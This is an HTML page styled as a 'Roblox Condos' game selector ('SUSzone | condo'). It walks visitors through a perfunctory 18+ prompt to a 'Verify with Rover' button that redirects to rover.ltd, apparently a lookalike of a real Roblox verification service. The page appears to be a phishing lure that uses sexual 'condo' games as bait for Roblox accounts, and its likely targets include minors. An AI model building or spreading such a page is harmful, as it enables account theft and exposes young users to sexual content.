<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Roblox Condos</title>

<style>
    body {
        font-family: "Poppins", sans-serif;
        background: linear-gradient(135deg, #ffd6f4, #ffeaf7, #fff6ff);
        text-align: center;
        padding-top: 40px;
        animation: fadeIn 1s ease-in-out;
    }

    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }

    .box {
        background: rgba(255, 255, 255, 0.85);
        width: 400px;
        margin: auto;
        padding: 25px;
        border-radius: 22px;
        box-shadow: 0 8px 20px rgba(255, 126, 193, 0.25);
        border: 2px solid #ffb2e8;
        backdrop-filter: blur(10px);
        transition: 0.3s;
    }

    .box:hover {
        transform: scale(1.02);
    }

    h2, h3 {
        color: #ff53c9;
        font-weight: 700;
        text-shadow: 0 1px 3px rgba(255, 140, 220, 0.4);
    }

    p {
        color: #ff77d6;
        font-size: 15px;
        margin-bottom: 10px;
    }

    button {
        padding: 12px 22px;
        margin: 8px;
        border: none;
        border-radius: 12px;
        cursor: pointer;
        font-size: 15px;
        font-weight: 600;
        transition: 0.2s;
    }

    button:hover {
        transform: scale(1.07);
    }

    .game-btn {
        background: #ffb3ec;
        color: white;
        width: 90%;
        box-shadow: 0 4px 10px rgba(255, 145, 215, 0.4);
    }

    .yes-btn {
        background: #ff7ad9;
        color: white;
    }

    .no-btn {
        background: #ff6f9e;
        color: white;
    }

    .verify-btn {
        background: #ff4fc4;
        color: white;
        box-shadow: 0 4px 10px rgba(255, 91, 192, 0.5);
    }

    .cancel-btn {
        background: #c9c9c9;
        color: white;
    }

    .small-heart {
        font-size: 22px;
        margin-bottom: 10px;
        animation: heartbeat 1.3s infinite;
        color: #ff5fc5;
    }

    @keyframes heartbeat {
        0% { transform: scale(1); }
        50% { transform: scale(1.25); }
        100% { transform: scale(1); }
    }
</style>
</head>

<body>

<div class="box" id="main">
    <div class="small-heart">‚ô°</div>
    <h2>SUSzone | condo</h2>
    <p>Select a condo game to continue!</p>

    
    <button class="game-btn" onclick="joinGame('Game 1')">üçì Cozy Game #1</button>
    <button class="game-btn" onclick="joinGame('Game 2')">üå∏ Yumi Goat #2</button>
    <button class="game-btn" onclick="joinGame('Game 3')">üíó Yumi Goat V0.2 #3</button>
    <button class="game-btn" onclick="joinGame('Game 1')">üçë SUS neko #4</button>
</div>

<div class="box" id="ageCheck" style="display:none;">
    <h3>Are you 18+?</h3>
    <button class="yes-btn" onclick="showVerify()">Yes</button>
    <button class="no-btn" onclick="notEligible()">No</button>
</div>

<div class="box" id="verifyBox" style="display:none;">
    <h3>Verification Needed</h3>
    <p>Please verify with Rover to continue ‚ô°</p>

    
    <button class="verify-btn"
        onclick="window.location.href='https://rover.ltd/verify/?guild=4019592930661884#'">
        Verify ‚úî
    </button>

    <button class="cancel-btn" onclick="notEligible()">Do Not Verify</button>
</div>

<div class="box" id="notEligibleBox" style="display:none;">
    <h3>Not Eligible</h3>
    <p>Sorry! You cannot play right now üíî</p>
</div>

<script>
function joinGame(gameName) {
    selectedGame = gameName;
    document.getElementById("main").style.display = "none";
    document.getElementById("ageCheck").style.display = "block";
}

function showVerify() {
    document.getElementById("ageCheck").style.display = "none";
    document.getElementById("verifyBox").style.display = "block";
}

function notEligible() {
    document.getElementById("ageCheck").style.display = "none";
    document.getElementById("verifyBox").style.display = "none";
    document.getElementById("notEligibleBox").style.display = "block";
}
</script>

</body>
</html>
